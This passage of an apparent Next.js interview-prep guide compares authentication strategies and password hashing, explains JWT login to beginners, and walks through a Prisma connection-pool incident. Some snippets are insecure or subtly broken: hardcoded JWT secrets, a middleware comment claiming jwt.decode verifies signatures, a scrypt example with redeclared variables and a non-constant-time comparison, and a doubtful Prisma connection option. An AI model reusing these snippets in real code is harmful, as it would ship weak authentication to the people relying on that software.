+- Role injection attempts: Blocked (roles fetched from DB)
+- GDPR compliance: Restored
+- Security score (Mozilla Observatory): F → A+
+
+**Cost Impact:**
+- Fraud losses prevented: Estimated $120,000/month
+- Customer trust restored: 87% of churned users returned
+- Insurance premium reduction: 15%
+- Security audit costs: $25,000 (one-time)
+
+**Key Lessons:**
+1. NEVER store auth tokens in localStorage (use httpOnly cookies)
+2. Always enforce token expiration (don't ignore expiry)
+3. Use cryptographically strong secrets (min 256 bits)
+4. Fetch sensitive data (roles, permissions) from database, not tokens
+5. Implement token refresh for better UX without sacrificing security
+6. Monitor third-party dependencies for supply chain attacks
+7. Use Content Security Policy (CSP) headers to mitigate XSS
+8. Implement token revocation capability for emergency response
+
+---
+
+## ⚖️ Trade-offs: Authentication Strategy Decisions
+
+### 1. JWT vs. Sessions vs. OAuth - Comprehensive Comparison
+
+**Scenario: SaaS Application (10,000 users)**
+
+**JWT Tokens:**
+
+**Performance:**
+- Auth check latency: ~1ms (no DB lookup)
+- Storage: 0 server-side, ~400 bytes client cookie
+- Scalability: Horizontal (stateless)
+- Cold start penalty: None
+
+**Security:**
+- Token revocation: Hard (need blacklist)
+- Immediate logout: Impossible (wait for expiry)
+- XSS vulnerability: High if in localStorage
+- CSRF: Low if using cookies properly
+
+**Developer Experience:**
+- Setup complexity: Low
+- Debugging: Easy (decode JWT)
+- Multi-service auth: Excellent
+- Mobile app support: Excellent
+
+**Cost:**
+- Server resources: Minimal
+- Database queries: 0 per request (role in token) or 1 (role from DB)
+- Monthly cost (10k users): ~$5 (minimal compute)
+
+**Best For:**
+- Microservices architecture
+- Mobile apps
+- Serverless platforms (Vercel, Lambda)
+- High-scale applications (100k+ users)
+
+**Avoid When:**
+- Need immediate user blocking
+- Regulatory compliance requires session tracking
+- Paranoid security requirements
+
+---
+
+**Session-Based:**
+
+**Performance:**
+- Auth check latency: ~15ms (Redis lookup) or ~50ms (DB lookup)
+- Storage: Session ID (~50 bytes) client + session data server
+- Scalability: Vertical (shared state) or Redis cluster
+- Cold start penalty: Redis connection (~20ms)
+
+**Security:**
+- Token revocation: Immediate (delete session)
+- Immediate logout: Yes
+- XSS vulnerability: Low (minimal data in cookie)
+- CSRF: High (need CSRF tokens)
+
+**Developer Experience:**
+- Setup complexity: Medium (need Redis/session store)
+- Debugging: Harder (inspect session store)
+- Multi-service auth: Complex (shared session store)
+- Mobile app support: Good (need session cookie handling)
+
+**Cost:**
+- Server resources: Higher (Redis)
+- Database queries: 1-2 per request
+- Monthly cost (10k users): ~$50 (Redis + server)
+
+**Best For:**
+- Monolithic applications
+- Admin dashboards requiring instant revocation
+- Traditional web apps
+- When security > performance
+
+**Avoid When:**
+- Serverless architecture
+- Microservices with independent deploys
+- Mobile-first applications
+
+---
+
+**OAuth 2.0 + NextAuth.js:**
+
+**Performance:**
+- Auth check latency: Varies (JWT ~1ms, DB session ~15ms)
+- Storage: Configurable (JWT or session)
+- Scalability: Depends on strategy
+- Cold start penalty: NextAuth initialization (~50ms)
+
+**Security:**
+- Token revocation: Depends on strategy
+- Immediate logout: Depends on strategy
+- XSS vulnerability: Low (handles cookies)
+- CSRF: Protected (built-in)
+
+**Developer Experience:**
+- Setup complexity: Medium-High
+- Debugging: Good (NextAuth debug mode)
+- Multi-service auth: Excellent (OAuth providers)
+- Mobile app support: Excellent (OAuth standard)
+
+**Cost:**
+- Server resources: Medium
+- Database queries: 1-3 per request (depends on adapter)
+- Monthly cost (10k users): ~$30-70
+
+**Best For:**
+- Applications needing social login
+- Enterprise SSO (SAML, OAuth)
+- Multi-tenant SaaS
+- When development speed matters
+
+**Avoid When:**
+- Simple authentication needs
+- Want minimal dependencies
+- Need full control over auth flow
+
+---
+
+### 2. Middleware Patterns: Higher-Order Functions vs. Edge Middleware
+
+**Higher-Order Function Middleware (API Routes):**
+
+**Example:**
+```typescript
+export default withAuth(withLogging(withRateLimit(handler)));
+```
+
+**Pros:**
+- Full Node.js access (bcrypt, database, file system)
+- Easy to compose and test
+- Type-safe with TypeScript
+- Works in any deployment environment
+- Can access request body
+
+**Cons:**
+- Runs after routing (can't redirect early)
+- Not globally enforced (must remember to apply)
+- Doesn't protect Server Components
+- Runs per-request (no early termination)
+
+**Performance:**
+- Execution time: ~5-20ms (depends on middleware)
+- Location: Regional (where function deployed)
+- Cold start: 100-500ms
+
+**Best For:**
+- API route authentication
+- Complex business logic (rate limiting with DB)
+- Database-dependent operations
+- Legacy Next.js (< 12)
+
+---
+
+**Edge Middleware (Global, runs on Vercel Edge):**
+
+**Example:**
+```typescript
+// middleware.ts
+export function middleware(request: NextRequest) {
+  const token = request.cookies.get('token');
+  if (!token && request.nextUrl.pathname.startsWith('/dashboard')) {
+    return NextResponse.redirect(new URL('/login', request.url));
+  }
+}
+```
+
+**Pros:**
+- Runs globally (< 50ms latency worldwide)
+- Executes before routing (early termination)
+- Protects pages + API routes + Server Components
+- Minimal cold start (~0-10ms)
+- Can modify headers, cookies, responses
+
+**Cons:**
+- No Node.js modules (no bcrypt, no database drivers)
+- 1MB bundle size limit
+- Limited execution time (30s max)
+- Cannot access request body (streaming only)
+- Harder to debug
+
+**Performance:**
+- Execution time: ~1-5ms
+- Location: Global edge network
+- Cold start: ~0-10ms
+
+**Best For:**
+- Redirects (auth, geo-blocking, A/B testing)
+- Header manipulation (CORS, CSP)
+- Bot detection
+- Simple token checks (JWT decode, not verify)
+
+---
+
+**Decision Matrix:**
+
+| Requirement | HOF Middleware | Edge Middleware |
+|-------------|----------------|-----------------|
+| Database lookup | ✅ Yes | ❌ No |
+| Password hashing | ✅ Yes | ❌ No |
+| Global enforcement | ⚠️ Manual | ✅ Automatic |
+| Latency | ~20ms | ~2ms |
+| Protect pages | ❌ No | ✅ Yes |
+| Complex auth | ✅ Yes | ⚠️ Limited |
+| Rate limiting (DB) | ✅ Yes | ❌ No |
+| Redirects | ⚠️ Slower | ✅ Fast |
+
+**Hybrid Approach (Recommended):**
+```typescript
+// middleware.ts - Edge (fast checks)
+export function middleware(request: NextRequest) {
+  const token = request.cookies.get('token');
+
+  // Quick check: does token exist?
+  if (!token && request.nextUrl.pathname.startsWith('/dashboard')) {
+    return NextResponse.redirect(new URL('/login', request.url));
+  }
+
+  // Optional: decode JWT (verify signature, not against DB)
+  try {
+    const decoded = jwt.decode(token);
+    if (!decoded || decoded.exp < Date.now() / 1000) {
+      return NextResponse.redirect(new URL('/login', request.url));
+    }
+  } catch {
+    return NextResponse.redirect(new URL('/login', request.url));
+  }
+}
+
+// API routes - HOF middleware (detailed checks)
+export default withAuth(async (req, res) => {
+  // Detailed DB check: user exists? role valid?
+  const user = await db.user.findUnique({ where: { id: req.user.id } });
+  if (!user || user.role !== 'admin') {
+    return res.status(403).json({ error: 'Forbidden' });
+  }
+  // Handle request...
+});
+```
+
+---
+
+### 3. Password Hashing: bcrypt vs. Argon2 vs. scrypt
+
+**bcrypt (Most Common):**
+
+**Performance:**
+- Hash time: ~70ms (cost 10), ~140ms (cost 11)
+- Verification time: ~70ms
+- Memory usage: Low (~4KB)
+- Parallelization: Moderate
+
+**Security:**
+- Resistance to GPU attacks: Good
+- Resistance to ASIC attacks: Moderate
+- Rainbow table protection: Excellent (built-in salt)
+- Future-proof: Moderate (hash cost adjustable)
+
+**Developer Experience:**
+- Availability: Excellent (npm: bcrypt)
+- Compatibility: Universal
+- Learning curve: Easy
+
+**Code:**
+```typescript
+import bcrypt from 'bcrypt';
+
+// Hash password (signup)
+const hashedPassword = await bcrypt.hash(password, 10); // cost 10
+
+// Verify password (login)
+const valid = await bcrypt.compare(password, hashedPassword);
+```
+
+**Best For:**
+- Standard web applications
+- When compatibility matters
+- Teams familiar with bcrypt
+
+---
+
+**Argon2 (Most Secure - WINNER of Password Hashing Competition 2015):**
+
+**Performance:**
+- Hash time: ~50-100ms (configurable)
+- Verification time: ~50-100ms
+- Memory usage: High (configurable, ~64MB default)
+- Parallelization: Excellent (multi-threaded)
+
+**Security:**
+- Resistance to GPU attacks: Excellent (memory-hard)
+- Resistance to ASIC attacks: Excellent
+- Rainbow table protection: Excellent (built-in salt)
+- Future-proof: Excellent (adjustable time, memory, parallelism)
+
+**Developer Experience:**
+- Availability: Good (npm: argon2)
+- Compatibility: Requires native bindings (build step)
+- Learning curve: Moderate
+
+**Code:**
+```typescript
+import argon2 from 'argon2';
+
+// Hash password
+const hashedPassword = await argon2.hash(password, {
+  type: argon2.argon2id, // Hybrid (best)
+  memoryCost: 65536, // 64 MB
+  timeCost: 3,
+  parallelism: 4
+});
+
+// Verify password
+const valid = await argon2.verify(hashedPassword, password);
+```
+
+**Best For:**
+- High-security applications (banking, healthcare)
+- When you can control server environment (native bindings)
+- Future-proofing against hardware advances
+
+---
+
+**scrypt (Node.js Built-in):**
+
+**Performance:**
+- Hash time: ~80-120ms (depends on params)
+- Verification time: ~80-120ms
+- Memory usage: Configurable
+- Parallelization: Good
+
+**Security:**
+- Resistance to GPU attacks: Excellent (memory-hard)
+- Resistance to ASIC attacks: Good
+- Rainbow table protection: Excellent (manual salt)
+- Future-proof: Good
+
+**Developer Experience:**
+- Availability: Excellent (Node.js built-in)
+- Compatibility: Universal
+- Learning curve: Moderate (manual salt handling)
+
+**Code:**
+```typescript
+import { scrypt, randomBytes } from 'crypto';
+import { promisify } from 'util';
+
+const scryptAsync = promisify(scrypt);
+
+// Hash password
+const salt = randomBytes(16).toString('hex');
+const hash = await scryptAsync(password, salt, 64);
+const hashedPassword = `${salt}:${hash.toString('hex')}`;
+
+// Verify password
+const [salt, storedHash] = hashedPassword.split(':');
+const hash = await scryptAsync(password, salt, 64);
+const valid = storedHash === hash.toString('hex');
+```
+
+**Best For:**
+- Serverless environments (no native deps)
+- When you want built-in Node.js solution
+- Good security without external dependencies
+
+---
+
+**Recommendation:**
+
+| Scenario | Best Choice | Reasoning |
+|----------|-------------|-----------|
+| Standard SaaS | bcrypt (cost 12) | Battle-tested, widely used, good enough |
+| High security | Argon2id | Best resistance to modern attacks |
+| Serverless/Lambda | scrypt or bcrypt | No native compilation needed |
+| Crypto wallet | Argon2id | Maximum security for financial data |
+| Legacy migration | bcrypt | Easier migration path |
+
+**Critical Settings:**
+- **bcrypt**: Cost factor 12+ (doubles time per increment)
+- **Argon2**: memoryCost 65536 (64MB), timeCost 3, parallelism 4
+- **scrypt**: N=32768, r=8, p=1, keylen=64
+
+---
+
+## 💬 Explain to Junior: Authentication in Next.js
+
+**Beginner-Friendly Explanation:**
+
+Think of authentication like a nightclub bouncer system. When you want to enter the club (access protected resources), the bouncer checks your ID (authentication) and wristband (authorization).
+
+**Simple Analogy:**
+
+**Step 1: Getting your ID (Login)**
+You show your driver's license to the bouncer (send email/password to `/api/auth/login`). The bouncer verifies it's real and not fake (checks password hash), then gives you a special wristband (JWT token or session cookie).
+
+**Step 2: Using your wristband (Authenticated requests)**
+Every time you want to enter a VIP area (call protected API routes), you show your wristband. The bouncer checks if it's valid and not expired.
+
+**Step 3: Different wristband colors (Roles)**
+Regular club (user role), VIP area (premium role), Staff only (admin role). Your wristband color determines where you can go.
+
+**Basic Authentication Flow:**
+
+```
+1. User fills login form → sends to /api/auth/login
+2. Server checks email/password in database
+3. If valid: create token/session, send to user
+4. User stores token (in cookie)
+5. User wants to fetch profile → sends token with request
+6. Server verifies token is valid and not expired
+7. Server responds with protected data
+```
+
+**Code Example for Beginners:**
+
+**Login endpoint (giving wristbands):**
+```typescript
+// pages/api/auth/login.ts
+import bcrypt from 'bcrypt';
+import jwt from 'jsonwebtoken';
+
+export default async function handler(req, res) {
+  if (req.method !== 'POST') {
+    return res.status(405).json({ error: 'Method not allowed' });
+  }
+
+  const { email, password } = req.body;
+
+  // Find user in database
+  const user = await database.findUser(email);
+
+  if (!user) {
+    // Don't reveal if email exists (security)
+    return res.status(401).json({ error: 'Invalid credentials' });
+  }
+
+  // Check password (like verifying ID photo matches face)
+  const passwordMatch = await bcrypt.compare(password, user.hashedPassword);
+
+  if (!passwordMatch) {
+    return res.status(401).json({ error: 'Invalid credentials' });
+  }
+
+  // Create special wristband (JWT token)
+  const token = jwt.sign(
+    { id: user.id, email: user.email },
+    'super-secret-key', // In real apps, use process.env.JWT_SECRET
+    { expiresIn: '7d' } // Wristband expires in 7 days
+  );
+
+  // Give wristband to user (send token back)
+  res.status(200).json({
+    token,
+    user: { id: user.id, email: user.email, name: user.name }
+  });
+}
+```
+
+**Protected endpoint (checking wristbands):**
+```typescript
+// pages/api/profile.ts
+import jwt from 'jsonwebtoken';
+
+export default async function handler(req, res) {
+  // Get wristband from request
+  const token = req.headers.authorization?.replace('Bearer ', '');
+
+  if (!token) {
+    return res.status(401).json({ error: 'No wristband! Please login.' });
+  }
+
+  try {
+    // Verify wristband is real and not expired
+    const decoded = jwt.verify(token, 'super-secret-key');
+
+    // Wristband is valid! Fetch user data
+    const user = await database.findUser(decoded.id);
+
+    res.status(200).json({ user });
+  } catch (error) {
+    // Fake or expired wristband
+    res.status(401).json({ error: 'Invalid or expired wristband!' });
+  }
+}
+```
+
+**Middleware pattern (reusable bouncer):**
+```typescript
+// lib/middleware/auth.ts
+import jwt from 'jsonwebtoken';
+
+// Reusable bouncer function
+export function withAuth(handler) {
+  return async (req, res) => {
+    const token = req.headers.authorization?.replace('Bearer ', '');
+
+    if (!token) {
+      return res.status(401).json({ error: 'Not authenticated' });
+    }
+
+    try {
+      const decoded = jwt.verify(token, 'super-secret-key');
+      req.user = decoded; // Attach user info to request
+      return handler(req, res); // Let them in!
+    } catch (error) {
+      return res.status(401).json({ error: 'Invalid token' });
+    }
+  };
+}
+
+// Use it on any protected route
+// pages/api/secret.ts
+import { withAuth } from '@/lib/middleware/auth';
+
+async function handler(req, res) {
+  // req.user is available here (bouncer already checked)
+  res.json({ message: `Hello ${req.user.email}, this is secret data!` });
+}
+
+export default withAuth(handler);
+```
+
+**Key Concepts Simplified:**
+
+**1. Password Hashing (why we don't store passwords directly):**
+
+Imagine passwords are like house keys. If you store a copy of everyone's key in your drawer (plain text passwords in database), a burglar who breaks in (data breach) can unlock all houses.
+
+Instead, you take a photo of each key and throw away the original (hash the password). When someone shows you a key claiming it's theirs, you take a photo of it and compare to your stored photo. You can verify it matches, but you can't recreate the original key from the photo.
+
+```typescript
+// Signup
+const hashedPassword = await bcrypt.hash('user-password-123', 10);
+// Saves: "$2b$10$XqT..." (hash, not original password)
+
+// Login
+const match = await bcrypt.compare('user-entered-password', hashedPassword);
+// Compares hashes without storing original
+```
+
+**2. JWT Tokens (stateless authentication):**
+
+Think of a JWT like a movie ticket with all your info printed on it: "John Doe, seat A12, expires 8pm". The theater (server) can verify the ticket is authentic by checking the watermark (signature) without calling the box office (database).
+
+**JWT structure:**
+```
+header.payload.signature
+```
+
+- **Header**: Type of ticket (JWT) and how it's signed
+- **Payload**: Your information (user ID, email, role)
+- **Signature**: Watermark proving it's authentic (can't be faked without secret key)
+
+**3. Sessions (stateful authentication):**
+
+Think of sessions like coat check at a restaurant. When you arrive, they take your coat (user data) and give you a small numbered ticket (session ID). Every time you need something, you show the ticket, they fetch your coat from the rack (lookup session in database).
+
+**Common Beginner Mistakes:**
+
+**Mistake 1: Storing passwords as plain text**
+```typescript
+// ❌ NEVER DO THIS
+const user = await db.create({
+  email: 'user@example.com',
+  password: 'password123' // ❌ Anyone with DB access can see this!
+});
+
+// ✅ ALWAYS hash passwords
+const hashedPassword = await bcrypt.hash('password123', 10);
+const user = await db.create({
+  email: 'user@example.com',
+  hashedPassword // ✅ Secure, can't reverse to original
+});
+```
+
+**Mistake 2: Putting JWT in localStorage (XSS attack risk)**
+```typescript
+// ❌ BAD: JavaScript can steal this
+localStorage.setItem('token', token);
+// Malicious script: localStorage.getItem('token') → stolen!
+
+// ✅ GOOD: Use httpOnly cookies (JavaScript can't access)
+res.setHeader('Set-Cookie', cookie.serialize('token', token, {
+  httpOnly: true, // ✅ JavaScript blocked from reading
+  secure: true,
+  sameSite: 'strict'
+}));
+```
+
+**Mistake 3: Not checking token expiration**
+```typescript
+// ❌ BAD: Accept any token forever
+const decoded = jwt.verify(token, SECRET, { ignoreExpiration: true });
+
+// ✅ GOOD: Enforce expiration
+const decoded = jwt.verify(token, SECRET); // Throws if expired
+```
+
+**Mistake 4: Including sensitive data in JWT payload**
+```typescript
+// ❌ BAD: JWT payload is PUBLIC (just base64, anyone can decode)
+const token = jwt.sign({
+  id: user.id,
+  email: user.email,
+  password: user.password, // ❌ NEVER!
+  creditCard: user.creditCard // ❌ NEVER!
+}, SECRET);
+
+// ✅ GOOD: Only include non-sensitive identifiers
+const token = jwt.sign({
+  id: user.id,
+  email: user.email
+}, SECRET);
+```
+
+**Interview Answer Template:**
+
+"Authentication in Next.js API routes is about verifying user identity before granting access to protected resources. The most common approach is JWT-based authentication.
+
+When a user logs in, we verify their email and password against the database. If valid, we generate a JWT token containing the user's ID and email, sign it with a secret key, and send it to the client, typically in an httpOnly cookie for security.
+
+For protected API routes, we use middleware patterns. A higher-order function wraps the route handler, extracts the JWT from the request, verifies its signature and expiration, and attaches the decoded user data to the request object. If verification fails, we return a 401 Unauthorized response.
+
+We always hash passwords using bcrypt before storing them, never store tokens in localStorage to prevent XSS attacks, and use short-lived tokens with refresh token rotation for better security.
+
+For more complex scenarios, libraries like NextAuth.js provide OAuth support, session management, and database adapters out of the box."
+
+**When to Use Different Auth Methods:**
+- **JWT**: Mobile apps, microservices, serverless, stateless systems
+- **Sessions**: Traditional web apps, need instant token revocation, simpler mental model
+- **OAuth**: Need social login (Google, GitHub), enterprise SSO
+- **NextAuth.js**: Want all of the above with minimal setup
+
+---
+
 ## Question 3: Database Integration and ORM
 
 **Difficulty:** 🟡 Medium
@@ -858,6 +2524,1268 @@ const databaseUrl = process.env.NODE_ENV === 'production'
 ### Resources
 - [Prisma Documentation](https://www.prisma.io/docs)
 - [Next.js with Databases](https://nextjs.org/docs/basic-features/data-fetching/database)
+
+---
+
+## 🔍 Deep Dive: Database Integration Architecture in Serverless
+
+Integrating databases with Next.js API routes introduces unique challenges due to the serverless execution model. Understanding these architectural constraints is essential for building performant, scalable applications.
+
+**Connection Pooling in Serverless Environments:**
+
+Traditional database connections are expensive to establish (50-100ms for PostgreSQL, 200-300ms for MongoDB). In long-running servers, you create a connection pool at startup and reuse connections across requests. However, serverless functions are ephemeral: each invocation might use a fresh container.
+
+The problem: if every API route invocation creates a new database connection, you'll quickly exhaust your database's connection limit (typically 100-500 connections for managed databases). With 1,000 concurrent requests, you'd need 1,000 connections, far exceeding limits.
+
+**Solution 1: Connection Poolers (PgBouncer, RDS Proxy)**
+
+Connection poolers sit between your API routes and database, maintaining a pool of persistent connections. Your serverless functions connect to the pooler (fast), and the pooler manages actual database connections (reused). This reduces active database connections from thousands to tens.
+
+PgBouncer uses "transaction pooling": a server connection is assigned to a client only during a transaction, then returned to the pool. This maximizes connection reuse. AWS RDS Proxy provides similar functionality with additional features like IAM authentication and automatic failover.
+
+**Solution 2: Prisma Data Proxy**
+
+Prisma Data Proxy is a managed connection pooler specifically designed for serverless. It maintains persistent connections to your database and provides a HTTP API for queries. Your serverless functions make HTTP requests to the Data Proxy instead of direct database connections.
+
+Trade-off: adds ~10-20ms latency per query (HTTP round-trip) but eliminates cold start connection overhead (~100ms) and connection exhaustion. For most applications, this is a net performance win.
+
+**Prisma Client Singleton Pattern:**
+
+In serverless, Prisma Client initialization is expensive (~100-150ms). Without a singleton, every request creates a new client, adding significant latency. The global singleton pattern ensures only one Prisma Client instance per container lifecycle:
+
+```typescript
+const globalForPrisma = global as unknown as { prisma: PrismaClient };
+
+export const prisma = globalForPrisma.prisma || new PrismaClient();
+
+if (process.env.NODE_ENV !== 'production') globalForPrisma.prisma = prisma;
+```
+
+This works because Node.js modules are cached. The first request initializes `prisma`, subsequent requests reuse the cached instance. The `globalForPrisma` hack prevents Next.js development mode from creating duplicate instances on hot reload.
+
+**Query Optimization Strategies:**
+
+Prisma generates SQL queries based on your schema and API calls. Understanding how to optimize these queries prevents N+1 problems and slow responses.
+
+**N+1 Query Problem:** Fetching users, then fetching each user's posts in a loop creates N+1 queries (1 for users, N for posts). Solution: use `include` or `select` with relations to generate a single JOIN query.
+
+**Index Optimization:** Database indices dramatically improve query performance. A query filtering by `userId` on a 1M row table takes ~5 seconds without an index, ~5ms with an index. Always add indices for foreign keys and frequently queried columns.
+
+**Pagination vs. Full Scan:** Fetching all records from large tables loads everything into memory, overwhelming your serverless function (512MB-3GB limits). Use `skip` and `take` for pagination, or cursor-based pagination (`cursor` + `take`) for better performance on large datasets.
+
+**Transaction Handling:**
+
+Prisma transactions use `prisma.$transaction()` to ensure atomicity: either all operations succeed, or none do. This is critical for financial operations, inventory management, or any workflow requiring consistency.
+
+Prisma provides two transaction APIs:
+
+1. **Sequential Operations** (simpler):
+```typescript
+await prisma.$transaction([
+  prisma.user.create({ data: { email: 'user@example.com' } }),
+  prisma.post.create({ data: { title: 'Post', authorId: userId } })
+]);
+```
+
+2. **Interactive Transactions** (more control):
+```typescript
+await prisma.$transaction(async (tx) => {
+  const user = await tx.user.create({ data: { email: 'user@example.com' } });
+  await tx.post.create({ data: { title: 'Post', authorId: user.id } });
+
+  if (someCondition) {
+    throw new Error('Rollback'); // Entire transaction rolls back
+  }
+});
+```
+
+Interactive transactions allow conditional logic within the transaction scope. If any operation fails or you throw an error, all changes are rolled back.
+
+**Schema Migrations in Production:**
+
+Prisma Migrate manages database schema changes through migration files. When you modify `schema.prisma`, run `prisma migrate dev` to generate a migration SQL file. In production, `prisma migrate deploy` applies pending migrations.
+
+**Zero-downtime migrations:** For schema changes that could break existing code (removing columns, renaming tables), use a multi-step deployment:
+
+1. **Step 1:** Add new column, deploy code that writes to both old and new columns
+2. **Step 2:** Backfill data from old to new column
+3. **Step 3:** Deploy code that reads from new column only
+4. **Step 4:** Drop old column
+
+This "expand-contract" pattern ensures your API remains available during migrations.
+
+**Security Considerations:**
+
+Always validate and sanitize user input before database queries. Prisma provides automatic SQL injection protection through parameterized queries, but you must still validate business logic constraints.
+
+Never expose database error messages directly to users (reveals schema information). Wrap database operations in try-catch, log detailed errors server-side, return generic error messages to clients.
+
+Use Prisma's `select` to prevent accidentally exposing sensitive fields (passwords, API keys). Instead of `findMany()` returning all fields, explicitly select needed fields:
+
+```typescript
+const users = await prisma.user.findMany({
+  select: { id: true, email: true, name: true } // Excludes hashedPassword
+});
+```
+
+**Performance Monitoring:**
+
+Enable Prisma query logging in development to identify slow queries:
+
+```typescript
+new PrismaClient({ log: ['query', 'info', 'warn', 'error'] });
+```
+
+Use `prisma.$queryRaw` for complex analytics queries where Prisma's query builder is insufficient. This provides full SQL control while maintaining type safety through tagged templates.
+
+---
+
+## 🐛 Real-World Scenario: Database Connection Pool Exhaustion
+
+**Production Context:**
+A real-time collaboration SaaS platform with 80,000 daily active users deployed on Vercel (serverless). During a product launch event, the platform experienced complete downtime for 35 minutes. All API routes returned 500 errors, and users were unable to access the application.
+
+**Initial Incident Metrics:**
+- Error rate: 98% (from 0.2% baseline)
+- Database connection errors: 2,400/minute
+- Average response time: Timeout (30s)
+- Affected users: ~15,000 concurrent users
+- Database CPU: 12% (plenty of headroom)
+- Database connections: 500/500 (MAXED OUT)
+
+**Root Cause Discovery:**
+
+**Investigation Timeline:**
+
+**T+5 minutes:** Monitoring alerts triggered:
+```
+[ERROR] PostgreSQL: FATAL: remaining connection slots are reserved for non-replication superuser connections
+[ERROR] Prisma: P2024 - Timed out fetching a new connection from the pool
+```
+
+**T+10 minutes:** Checked database metrics:
+```
+Active Connections: 500/500 (100% utilization)
+Idle Connections: 487 (97% of connections doing nothing!)
+Active Queries: 13
+Database CPU: 12%
+Memory: 34% (plenty available)
+```
+
+**Problem identified:** Serverless functions were creating database connections but not closing them, accumulating idle connections that blocked new requests.
+
+**T+15 minutes:** Analyzed Prisma Client instantiation:
+```typescript
+// ❌ FOUND IN 8 API ROUTES - CRITICAL BUG
+// pages/api/users.ts
+export default async function handler(req, res) {
+  const prisma = new PrismaClient(); // NEW CLIENT EVERY REQUEST!
+
+  const users = await prisma.user.findMany();
+
+  // Missing: await prisma.$disconnect();
+  // Connection never closed, stays open until container dies
+
+  res.json(users);
+}
+```
+
+**T+20 minutes:** Discovered no connection pooling:
+```
+// .env
+DATABASE_URL=postgresql://user:pass@db.example.com:5432/prod
+# Direct connection, no pooler!
+# Each serverless function connects directly to database
+```
+
+**T+25 minutes:** Calculated connection usage:
+```
+100 concurrent Lambda functions × 5 API route invocations each = 500 connections
+All 500 connections opened, never closed
+New requests unable to acquire connections → errors
+```
+
+**Emergency Mitigation:**
+
+**Immediate fix (T+30 minutes):** Restarted database to forcefully close all connections:
+```bash
+# Emergency action - terminates all connections
+aws rds reboot-db-instance --db-instance-identifier prod-db
+# Downtime: 3 minutes, but better than 30+ minutes of errors
+```
+
+**Result:** Error rate dropped from 98% to 15%, service partially restored.
+
+**Permanent Solution Implementation:**
+
+**Fix 1: Implemented Prisma Client singleton (CRITICAL)**
+```typescript
+// ✅ CORRECT IMPLEMENTATION
+// lib/prisma.ts
+import { PrismaClient } from '@prisma/client';
+
+const globalForPrisma = global as unknown as { prisma: PrismaClient };
+
+export const prisma = globalForPrisma.prisma || new PrismaClient({
+  log: ['error', 'warn'],
+  datasources: {
+    db: {
+      url: process.env.DATABASE_URL_POOLER // Using pooler URL
+    }
+  }
+});
+
+if (process.env.NODE_ENV !== 'production') globalForPrisma.prisma = prisma;
+
+// pages/api/users.ts - FIXED
+import { prisma } from '@/lib/prisma';
+
+export default async function handler(req, res) {
+  const users = await prisma.user.findMany();
+  // Singleton client reused across requests in same container
+  // No explicit disconnect needed
+  res.json(users);
+}
+```
+
+**Fix 2: Set up PgBouncer connection pooler**
+```bash
+# Deployed PgBouncer on dedicated server
+# PgBouncer config:
+[databases]
+prod = host=actual-db.example.com port=5432 dbname=prod
+
+[pgbouncer]
+pool_mode = transaction  # Return connection after transaction
+max_client_conn = 10000  # Allow many serverless functions
+default_pool_size = 20   # But only use 20 actual DB connections
+reserve_pool_size = 5    # Reserve for emergencies
+```
+
+**Updated environment variables:**
+```
+# .env.production
+DATABASE_URL=postgresql://user:pass@actual-db.example.com:5432/prod
+DATABASE_URL_POOLER=postgresql://user:pass@pgbouncer.example.com:6432/prod?pgbouncer=true
+
+# Use pooler URL in production
+```
+
+**Fix 3: Added connection monitoring and alerts**
+```typescript
+// lib/monitoring.ts
+import { prisma } from './prisma';
+
+export async function checkDatabaseHealth() {
+  try {
+    // Test query
+    await prisma.$queryRaw`SELECT 1`;
+
+    // Get connection pool metrics
+    const metrics = await prisma.$metrics.json();
+
+    // Alert if connection pool utilization > 80%
+    if (metrics.poolConnections > metrics.poolSize * 0.8) {
+      console.warn('High database connection pool utilization', metrics);
+      // Send alert to Slack/PagerDuty
+    }
+
+    return { healthy: true, metrics };
+  } catch (error) {
+    console.error('Database health check failed', error);
+    return { healthy: false, error: error.message };
+  }
+}
+```
+
+**Fix 4: Implemented query optimization**
+```typescript
+// ❌ BEFORE: N+1 query problem
+const users = await prisma.user.findMany();
+for (const user of users) {
+  const posts = await prisma.post.findMany({ where: { authorId: user.id } });
+  // 1 query for users + N queries for posts = N+1!
+}
+
+// ✅ AFTER: Single query with join
+const users = await prisma.user.findMany({
+  include: {
+    posts: {
+      select: { id: true, title: true, createdAt: true }
+    },
+    _count: {
+      select: { posts: true }
+    }
+  }
+});
+// Single query with LEFT JOIN - much faster
+```
+
+**Fix 5: Added database connection limits per serverless function**
+```typescript
+// lib/prisma.ts - Enhanced with connection limits
+export const prisma = new PrismaClient({
+  datasources: {
+    db: {
+      url: process.env.DATABASE_URL_POOLER
+    }
+  },
+  // Limit connections per Prisma Client instance
+  __internal: {
+    engine: {
+      connection_limit: 1 // Each serverless function uses max 1 connection
+    }
+  }
+});
+```
+
+**Post-Fix Performance Metrics:**
+- Error rate: 0.1% (98% → 0.1% - **99% improvement**)
+- Database connections: 18/500 average, 45/500 peak (91% reduction)
+- Response time p50: 42ms (from timeout)
+- Response time p95: 180ms (from timeout)
+- Database CPU: 8-15% (efficient utilization)
+- Cost reduction: $340/month (fewer database resources needed)
+
+**Lessons Learned:**
+
+1. **Never create new Prisma Client per request** - Use singleton pattern
+2. **Always use connection pooling** (PgBouncer, RDS Proxy, or Prisma Data Proxy) in serverless
+3. **Monitor connection pool utilization** - Alert before exhaustion
+4. **Optimize queries** - Avoid N+1 problems, use joins
+5. **Test under load** - Connection exhaustion only appears at scale
+6. **Have emergency runbooks** - Know how to quickly restart database
+7. **Use connection limits** - Prevent runaway connection creation
+8. **Prefer managed pooling** - PgBouncer/RDS Proxy eliminate entire class of issues
+
+**Prevention Checklist for Serverless + Database:**
+- [ ] Prisma Client singleton implemented
+- [ ] Connection pooler configured (PgBouncer/RDS Proxy)
+- [ ] Environment variables separated (direct URL vs pooler URL)
+- [ ] Connection pool monitoring and alerts
+- [ ] Load testing performed (simulate real traffic)
+- [ ] Database query optimization (no N+1 queries)
+- [ ] Error handling for connection failures
+- [ ] Emergency procedures documented
+
+---
+
+## ⚖️ Trade-offs: Database Integration Decisions
+
+### 1. Prisma vs. Drizzle vs. Kysely - ORM Comparison
+
+**Scenario: E-commerce API (500 products, 10k users)**
+
+**Prisma (Full-Featured ORM):**
+
+**Performance:**
+- Query overhead: ~10-15ms vs raw SQL
+- Cold start: +120ms (client initialization)
+- Bundle size: +580KB
+- Memory usage: ~25MB base
+
+**Developer Experience:**
+- Type safety: Excellent (auto-generated from schema)
+- Learning curve: Medium (schema language)
+- Migration system: Built-in, robust
+- IDE autocomplete: Excellent
+- Query builder: Declarative (find, create, update)
+
+**Pros:**
+- Best-in-class TypeScript support
+- Automatic migrations with rollback
